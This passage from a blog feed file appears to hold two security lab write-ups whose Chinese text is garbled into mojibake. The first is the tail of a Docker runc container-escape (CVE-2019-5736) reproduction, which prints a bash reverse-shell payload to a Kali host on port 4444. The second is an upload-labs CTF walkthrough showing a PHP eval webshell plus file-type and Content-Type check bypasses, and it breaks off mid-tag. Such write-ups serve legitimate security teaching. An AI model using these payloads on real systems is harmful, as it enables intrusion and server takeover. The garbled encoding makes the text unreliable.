æ³•è¿é€šï¼Œå¦‚æœkaliå…·å¤‡å…¬ç½‘ipä¸”centos7èƒ½å¤Ÿè®¿é—®äº’è”ç½‘ï¼Œåº”è¯¥ä¼šåå¼¹æˆåŠŸã€‚</p><ul><li><p>å°†centos7æ”¹æˆæ¡¥æ¥æ¨¡å¼ï¼ŒIP-192.168.43.181/24ã€‚kaliè¿˜æ˜¯è·å–ä¸åˆ°shellã€‚</p></li><li><p>å°†centos7æ”¹å›NATæ¨¡å¼ 192.168.52.4 ï¼Œkaliä¹Ÿæ”¹æˆNATæ¨¡å¼ 192.168.52.5ã€‚</p></li></ul><p>é‡æ–°æ“ä½œä¸€éã€‚</p><p>ä¿®æ”¹payloadçš„åå¼¹shellå›è¿åœ°å€ï¼š</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> payload<span class="token operator">=</span><span class="token string">"#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.52.5/4444 0&gt;&amp;1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2015.43.44.png" style="zoom:40%;"><p>æå®šï¼šâœ…</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2015.48.48.png" style="zoom:50%;"><p>æˆåŠŸè·å–åˆ°å®¿ä¸»æœºçš„shellï¼ˆipæ˜¯å®¿ä¸»æœºçš„ip192.168.52.4ï¼‰ï¼Œå¹¶ä¸”æƒé™æ˜¯rootã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2015.49.43.png" style="zoom:40%;"><blockquote><p>åŒæ ·çš„æ–¹æ³•åœ¨ubuntu16.04 é‡æ–°æ“ä½œä¸€æ¬¡ï¼Œè¿˜æ˜¯æ²¡æœ‰æˆåŠŸï¼š</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2016.03.03.png" style="zoom:67%;"><p>çœ‹æ¥è¯¥æ¼æ´çš„åˆ©ç”¨æ¯”è¾ƒä»¥æ¥æ“ä½œç³»ç»Ÿã€dockerå’Œruncçš„å…·ä½“ç‰ˆæœ¬ã€‚</p></blockquote><p>è‡³æ­¤ï¼Œdockerå®¹å™¨é€ƒé€¸-CVE-2019-5736æˆåŠŸå¤ç°ã€‚</p><h1 id="æ‹“å±•ï¼š"><a href="#æ‹“å±•ï¼š" class="headerlink" title="æ‹“å±•ï¼š"></a>æ‹“å±•ï¼š</h1><ul><li>2024å¹´1æœˆçš„ Runcå®¹å™¨é€ƒé€¸æ¼æ´ï¼š<a href="https://nitroc.org/posts/cve-2024-21626-illustrated/#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">https://nitroc.org/posts/cve-2024-21626-illustrated/#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´çŸ¥è¯†åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> å®¹å™¨é€ƒé€¸ </tag>
            
            <tag> CVE-2019-5736 </tag>
            
            <tag> dockeré€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-buuoj-(Upload-Labs-Linux)-æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/"/>
      <url>/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<h1 id="é¶åœºç®€ä»‹"><a href="#é¶åœºç®€ä»‹" class="headerlink" title="é¶åœºç®€ä»‹"></a>é¶åœºç®€ä»‹</h1><p><code>upload-labs</code>æ˜¯ä¸€ä¸ªä½¿ç”¨<code>php</code>è¯­è¨€ç¼–å†™çš„ï¼Œä¸“é—¨æ”¶é›†æ¸—é€æµ‹è¯•å’ŒCTFä¸­é‡åˆ°çš„å„ç§ä¸Šä¼ æ¼æ´çš„é¶åœºã€‚æ—¨åœ¨å¸®åŠ©å¤§å®¶å¯¹ä¸Šä¼ æ¼æ´æœ‰ä¸€ä¸ªå…¨é¢çš„äº†è§£ã€‚ç›®å‰ä¸€å…±21å…³ï¼Œæ¯ä¸€å…³éƒ½åŒ…å«ç€ä¸åŒä¸Šä¼ æ–¹å¼ã€‚</p><p>buuoj upload-labsé¶åœºï¼ˆç›®å‰20å…³ï¼‰é“¾æ¥ï¼š<a href="https://buuoj.cn/challenges#Upload-Labs-Linux">https://buuoj.cn/challenges#Upload-Labs-Linux</a> ï¼Œé¶åœºå…¶å®æ˜¯ä¸€ä¸ªéƒ¨ç½²åœ¨Linuxç¯å¢ƒä¸­çš„Upload-Labsï¼ˆç©è¿‡æ–‡ä»¶ä¸Šä¼ çš„åº”è¯¥éƒ½æ¥è§¦è¿‡è¿™ä¸ªé¶åœºï¼‰ã€‚</p><p>é¡¹ç›®åŸå§‹é“¾æ¥ï¼š<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a> ï¼Œbuuojçš„é¶åœºæœ‰äº›å…³å¡æœ‰é—®é¢˜ï¼Œæœ€å¥½è¿˜æ˜¯è‡ªå·±æ­å»ºä¸€ä¸‹ç¯å¢ƒï¼Œå¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯æœ‰äº›å…³å¡å¯¹æ“ä½œç³»ç»Ÿç±»å‹ï¼ˆwindows/linuxï¼‰å’ŒPHPçš„ç‰ˆæœ¬æ˜¯æœ‰é™åˆ¶çš„ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.37.09.png" style="zoom:30%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.36.54.png" style="zoom:30%;"><h1 id="ä¸€ã€Pass-01ï¼ˆå‰ç«¯æ£€æµ‹åç¼€åï¼‰"><a href="#ä¸€ã€Pass-01ï¼ˆå‰ç«¯æ£€æµ‹åç¼€åï¼‰" class="headerlink" title="ä¸€ã€Pass-01ï¼ˆå‰ç«¯æ£€æµ‹åç¼€åï¼‰"></a>ä¸€ã€Pass-01ï¼ˆå‰ç«¯æ£€æµ‹åç¼€åï¼‰</h1><h2 id="1-1-é¢˜é¢"><a href="#1-1-é¢˜é¢" class="headerlink" title="1.1 é¢˜é¢"></a>1.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.44.03.png" style="zoom:40%;"><h2 id="1-2-è§£é¢˜"><a href="#1-2-è§£é¢˜" class="headerlink" title="1.2 è§£é¢˜"></a>1.2 è§£é¢˜</h2><p>ç›´æ¥ä¸Šä¼ yjh.php</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.44.42.png" style="zoom:50%;"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>yakitå¼€å¯åŠ«æŒï¼Œç‚¹å‡»ä¸Šä¼ ï¼Œå‘ç°æœ‰å¼¹çª—æç¤ºåªèƒ½ä¸Šä¼ jpgã€pngã€gifç­‰ç±»å‹çš„æ–‡ä»¶ï¼Œå¹¶ä¸”yakitæ²¡æœ‰æŠ“åˆ°åŒ…ã€‚è¯´æ˜è¯·æ±‚åœ¨å‰ç«¯å°±è¢«æ‹¦æˆªäº†ï¼Œéƒ½æ²¡åˆ°yakité‚£é‡Œï¼Œæ‰€ä»¥æ¨æµ‹å‰ç«¯æœ‰ç›¸å…³çš„é˜²æŠ¤æªæ–½ï¼Œéœ€è¦å…ˆè¿›è¡Œç»•è¿‡ã€‚æŸ¥çœ‹å‰ç«¯çš„æºä»£ç ï¼Œå‘ç°æœ‰æ£€æµ‹æ–‡ä»¶åç¼€çš„é€»è¾‘ï¼Œç¡®å®æ˜¯åœ¨å‰ç«¯åšäº†é™åˆ¶ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>    <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span>        <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>        <span class="token comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span>        <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ "</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š"</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>            <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.45.49.png" style="zoom:40%;"><p>ç›´æ¥å°†æ–‡ä»¶çš„åç¼€å.phpåç¼€ä¸º.jpgï¼Œå°è¯•ç»•è¿‡å‰ç«¯å¹¶å¼€å¯æ‹¦æˆªã€‚è¿™æ¬¡èƒ½æ‹¦æˆªåˆ°è¯·æ±‚åŒ…äº†ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.55.27.png" style="zoom:50%;"><p> å‰ç«¯é™åˆ¶å·²è¢«ç»•è¿‡ã€‚åœ¨è¿™é‡Œå°†.jpgåç¼€æ”¹æˆ.phpåç¼€ï¼Œå› ä¸ºåªæœ‰è¿™æ ·æˆ‘ä»¬çš„webshellæ‰ä¼šè¢«æœåŠ¡ç«¯è§£ææ‰§è¡Œã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">"yjh.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¿®æ”¹ä¹‹åå‘é€è¯·æ±‚ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸäº†ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.58.16.png" style="zoom:50%;"><p>è¯´æ˜åç«¯æ²¡æœ‰åšä¸Šä¼ æ–‡ä»¶çš„å®‰å…¨æ£€æµ‹ï¼Œå¹¶ä¸”ä»å“åº”ä¸­ä¹Ÿèƒ½æ‰¾åˆ°ä¸Šä¼ æˆåŠŸçš„æ–‡ä»¶è·¯å¾„<code>../upload/yjh.php</code>ï¼Œå½“å‰è·¯å¾„æ˜¯<code>/Pass-01/index.php</code>ï¼Œé‚£ä¹ˆä¸Šä¼ çš„è·¯å¾„åº”è¯¥æ˜¯<code>/upload/yjh.php</code>ã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.59.52.png" style="zoom:50%;"><p>é‚£ä¹ˆæ¥ä¸‹æ¥å¯ä»¥å°è¯•è¿æ¥ä¸€ä¸‹webshellã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2018.04.03.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2018.05.12.png" style="zoom:50%;"><p>æˆåŠŸgetshellï¼Œå¹¶åœ¨æ ¹ç›®å½•ä¸‹æ‹¿åˆ°flagã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>6ee48577-f975-4280-9243-f91c87cadf98<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="1-3-ä»£ç å®¡è®¡"><a href="#1-3-ä»£ç å®¡è®¡" class="headerlink" title="1.3 ä»£ç å®¡è®¡"></a>1.3 ä»£ç å®¡è®¡</h2><p>çœ‹ä¸€ä¸‹æœ¬å…³çš„æºä»£ç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword type-declaration">null</span> <span class="token operator">||</span> <span class="token class-name">file</span> <span class="token operator">==</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span>    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string double-quoted-string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>    <span class="token comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span>    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token operator">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token operator">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token operator">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string double-quoted-string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string double-quoted-string">"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ "</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string double-quoted-string">"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š"</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æºä»£ç è¡¨æ˜ï¼Œæœ¬å…³ä»…ä»…åœ¨å‰ç«¯ç”¨jsåšäº†ä¸€ä¸‹åç¼€åçš„æ£€æµ‹ï¼Œæ‰€ä»¥åªè¦å€ŸåŠ©ä»£ç†å·¥å…·è¿™ç§æ£€æµ‹æ˜¯éå¸¸å®¹æ˜“ç»•è¿‡çš„ï¼›æ­¤å¤–é™¤äº†æ¥ä½ä»£ç†å·¥å…·ï¼Œç›´æ¥ä¿®æ”¹å‰ç«¯çš„jsä»£ç ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå‰ç«¯jsåœ¨å®¢æˆ·ç«¯çš„æµè§ˆå™¨è¿è¡Œï¼Œæ˜¯å®Œå…¨å¯ä»¥ç”±æ”»å‡»è€…è¿›è¡Œæ§åˆ¶çš„ã€‚</p><p>æ‰€ä»¥ï¼Œè¿™ç§åœ¨å‰ç«¯åšçš„æ–‡ä»¶å®‰å…¨æ€§æ£€æµ‹æ˜¯æœ€å®¹æ˜“è¢«æ”»ç ´çš„ï¼ŒåŸºæœ¬ä¸Šä¸å­˜åœ¨å®‰å…¨æ€§å¯è¨€ã€‚</p><h1 id="äºŒã€Pass-02ï¼ˆåç«¯æ£€æµ‹MIMEï¼‰"><a href="#äºŒã€Pass-02ï¼ˆåç«¯æ£€æµ‹MIMEï¼‰" class="headerlink" title="äºŒã€Pass-02ï¼ˆåç«¯æ£€æµ‹MIMEï¼‰"></a>äºŒã€Pass-02ï¼ˆåç«¯æ£€æµ‹MIMEï¼‰</h1><h2 id="2-1-é¢˜é¢"><a href="#2-1-é¢˜é¢" class="headerlink" title="2.1 é¢˜é¢"></a>2.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.50.34.png" style="zoom:50%;"><h2 id="2-2-è§£é¢˜"><a href="#2-2-è§£é¢˜" class="headerlink" title="2.2 è§£é¢˜"></a>2.2 è§£é¢˜</h2><ul><li>ç›´æ¥ä¸Šä¼ yjh.phpï¼Œæç¤ºæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ã€‚</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.44.42.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.51.41.png" style="zoom:50%;"><ul><li>æŠ“åŒ…</li></ul><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.53.07.png" style="zoom:50%;"><ul><li>å°è¯•ä¿®æ”¹Content-Typeç»•è¿‡</li></ul><blockquote><h4 id="Content-TypeçŸ¥å¤šå°‘"><a href="#Content-TypeçŸ¥å¤šå°‘" class="headerlink" title="Content-TypeçŸ¥å¤šå°‘"></a>Content-TypeçŸ¥å¤šå°‘</h4><p><code>Content-Type</code> æ˜¯ä¸€ä¸ª HTTP å¤´éƒ¨å­—æ®µï¼Œç”¨äºæŒ‡ç¤ºèµ„æºçš„åª’ä½“ç±»å‹ï¼ˆMIME ç±»å‹ï¼‰ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ <code>Content-Type</code> ç±»å‹ï¼š</p><p>æ–‡æœ¬ç±»å‹</p><ul><li><strong>text/plain</strong>ï¼šçº¯æ–‡æœ¬æ ¼å¼ï¼Œå¦‚æ–‡æœ¬æ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶ç­‰ã€‚å®ƒä¸åŒ…å«ä»»ä½•æ ¼å¼åŒ–ä¿¡æ¯ï¼ŒåªåŒ…å«å­—ç¬¦æ•°æ®ã€‚</li><li><strong>text/html</strong>ï¼šHTML æ–‡æ¡£ï¼Œç”¨äºç½‘é¡µçš„ç»“æ„å’Œå†…å®¹æè¿°ã€‚æµè§ˆå™¨ä¼šè§£æ HTML ä»£ç æ¥æ¸²æŸ“ç½‘é¡µçš„å¸ƒå±€ã€æ–‡æœ¬ã€å›¾ç‰‡ç­‰å…ƒç´ ã€‚</li><li><strong>text/css</strong>ï¼šCSS æ ·å¼è¡¨ï¼Œç”¨äºå®šä¹‰ HTML æ–‡æ¡£çš„æ ·å¼ï¼Œå¦‚å­—ä½“ã€é¢œè‰²ã€å¸ƒå±€ç­‰ã€‚å®ƒå¯ä»¥ä½¿ç½‘é¡µå…·æœ‰ç¾è§‚çš„è§†è§‰æ•ˆæœã€‚</li><li><strong>text/javascript</strong>ï¼šJavaScript è„šæœ¬ï¼Œç”¨äºå®ç°ç½‘é¡µçš„äº¤äº’åŠŸèƒ½ï¼Œå¦‚å“åº”ç”¨æˆ·æ“ä½œã€åŠ¨æ€æ›´æ–°å†…å®¹ç­‰ã€‚ä¸è¿‡åœ¨ç°ä»£å¼€å‘ä¸­ï¼Œæ›´æ¨èä½¿ç”¨ <code>application/javascript</code>ã€‚</li></ul><p>å›¾åƒç±»å‹</p><ul><li><strong>image/jpeg</strong>ï¼šJPEG å›¾åƒæ ¼å¼ï¼Œæ˜¯ä¸€ç§å¸¸ç”¨çš„æœ‰æŸå‹ç¼©å›¾åƒæ ¼å¼ï¼Œé€‚ç”¨äºå½©è‰²ç…§ç‰‡ç­‰å›¾åƒï¼Œèƒ½å¤Ÿåœ¨ä¿æŒä¸€å®šå›¾åƒè´¨é‡çš„æƒ…å†µä¸‹å‡å°æ–‡ä»¶å¤§å°ã€‚</li><li><strong>image/png</strong>ï¼šPNG å›¾åƒæ ¼å¼ï¼Œæ˜¯ä¸€ç§æ— æŸå‹ç¼©çš„ä½å›¾å›¾åƒæ ¼å¼ï¼Œæ”¯æŒé€æ˜åº¦ï¼Œé€‚ç”¨äºå›¾æ ‡ã€å¾½æ ‡ç­‰éœ€è¦é€æ˜èƒŒæ™¯çš„å›¾åƒã€‚</li><li><strong>image/gif</strong>ï¼šGIF å›¾åƒæ ¼å¼ï¼Œæ”¯æŒåŠ¨ç”»å’Œé€æ˜åº¦ï¼Œå¸¸ç”¨äºç®€å•çš„åŠ¨ç”»æ•ˆæœï¼Œå¦‚åŠ è½½åŠ¨ç”»ã€è¡¨æƒ…å›¾æ ‡ç­‰ã€‚ä¸è¿‡å®ƒçš„é¢œè‰²æ·±åº¦æœ‰é™ï¼Œæœ€å¤šåªèƒ½æ”¯æŒ 256 ç§é¢œè‰²ã€‚</li><li><strong>image/svg+xml</strong>ï¼šSVG å›¾åƒæ ¼å¼ï¼Œæ˜¯ä¸€ç§åŸºäº XML çš„çŸ¢é‡å›¾åƒæ ¼å¼ï¼Œå›¾åƒå¯ä»¥æ— é™æ”¾å¤§è€Œä¸å¤±çœŸï¼Œé€‚ç”¨äºå›¾æ ‡ã€å›¾è¡¨ç­‰éœ€è¦é«˜åˆ†è¾¨ç‡å’Œå¯ç¼©æ”¾çš„å›¾åƒã€‚</li></ul><p>åº”ç”¨ç¨‹åºç±»å‹</p><ul><li><strong>application/json</strong>ï¼šJSON æ•°æ®æ ¼å¼ï¼Œæ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®äº¤æ¢æ ¼å¼ï¼Œæ˜“äºé˜…è¯»å’Œç¼–å†™ï¼Œä¹Ÿæ˜“äºæœºå™¨è§£æå’Œç”Ÿæˆï¼Œå¹¿æ³›åº”ç”¨äº Web å¼€å‘ä¸­çš„æ•°æ®ä¼ è¾“ï¼Œå¦‚ AJAX è¯·æ±‚çš„å“åº”æ•°æ®ã€API æ¥å£çš„è¿”å›æ•°æ®ç­‰ã€‚</li><li><strong>application/xml</strong>ï¼šXML æ•°æ®æ ¼å¼ï¼Œæ˜¯ä¸€ç§å¯æ‰©å±•çš„æ ‡è®°è¯­è¨€ï¼Œç”¨äºæ•°æ®çš„å­˜å‚¨å’Œä¼ è¾“ï¼Œå…·æœ‰è‰¯å¥½çš„ç»“æ„æ€§å’Œå¯æ‰©å±•æ€§ï¼Œå¸¸ç”¨äºé…ç½®æ–‡ä»¶ã€æ•°æ®äº¤æ¢ç­‰åœºæ™¯ã€‚</li><li><strong>application/pdf</strong>ï¼šPDF æ–‡ä»¶æ ¼å¼ï¼Œæ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„æ–‡æ¡£æ ¼å¼ï¼Œå¯ä»¥åŒ…å«æ–‡æœ¬ã€å›¾åƒã€è¡¨æ ¼ã€è¶…é“¾æ¥ç­‰å¤šç§å…ƒç´ ï¼Œå…·æœ‰è¾ƒå¥½çš„å…¼å®¹æ€§å’Œå¯æ‰“å°æ€§ï¼Œé€‚ç”¨äºç”µå­æ–‡æ¡£çš„å±•ç¤ºã€åˆ†äº«å’Œæ‰“å°ã€‚</li><li><strong>application/zip</strong>ï¼šZIP å‹ç¼©æ–‡ä»¶æ ¼å¼ï¼Œç”¨äºå°†å¤šä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹å‹ç¼©æˆä¸€ä¸ªæ–‡ä»¶ï¼Œä¾¿äºå­˜å‚¨å’Œä¼ è¾“ï¼Œå¯ä»¥æœ‰æ•ˆå‡å°æ–‡ä»¶ä½“ç§¯ï¼ŒèŠ‚çœå­˜å‚¨ç©ºé—´å’Œä¼ è¾“æ—¶é—´ã€‚</li></ul></blockquote><p>æœç„¶ï¼Œä¸Šä¼ æˆåŠŸã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.56.22.png" style="zoom:50%;"><p>getshell</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.57.56.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-15%2017.58.28.png" style="zoom:50%;"><p>Flag:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>a44d95b2-084c-4996-9510-5c0b8704e067<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-3-ä»£ç å®¡è®¡"><a href="#2-3-ä»£ç å®¡è®¡" class="headerlink" title="2.3 ä»£ç å®¡è®¡"></a>2.3 ä»£ç å®¡è®¡</h2><img 